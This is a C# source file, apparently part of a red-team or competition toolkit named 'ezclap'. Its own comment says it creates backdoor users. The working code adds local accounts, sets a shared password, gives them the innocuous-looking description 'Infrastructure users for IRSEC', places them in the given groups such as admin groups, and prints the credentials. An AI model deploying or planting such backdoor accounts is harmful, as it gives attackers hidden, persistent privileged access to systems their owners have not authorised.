
using System;
using System.Data;
using System.DirectoryServices;
using System.Collections.Generic;

namespace ezclap
{
    /*
    *  Description: Creates backdoor users in either local or Active Directory environment 
    * 
    *  Params:
    *      - (string[]) name   = List of user names to be added 
    *      - (string)   pass   = Password of the user  
    *      - (string[]) groups = List of groups the user will join 
    */
    public class AddUser
    {
        public AddUser(string[] name, string pass, string[] groups)
        {
            Initialize(name, pass, groups);
        }

        public static void Initialize(string[] name, string pass, string[] groups)
        {
            foreach (string user in name)
            {
                try
                {
                    DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                    DirectoryEntry newUser = AD.Children.Add(user, "user");
                    newUser.Invoke("SetPassword", new object[] { pass });
                    newUser.Invoke("Put", new object[] { "Description", "Infrastructure users for IRSEC" });
                    newUser.CommitChanges();

                    foreach (string groupName in groups)
                    {
                        Console.WriteLine("[DEBUG] Adding [" + user + " to Group: " + groupName + "... ");
                        DirectoryEntry group = AD.Children.Find(groupName, "group");
                        if (group != null)
                        {
                            group.Invoke("Add", new object[] { newUser.Path.ToString() });
                            Console.WriteLine("[DEBUG] Adding Domain Admins... Username: {0}               Password: {1}", user, pass);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

    }
}
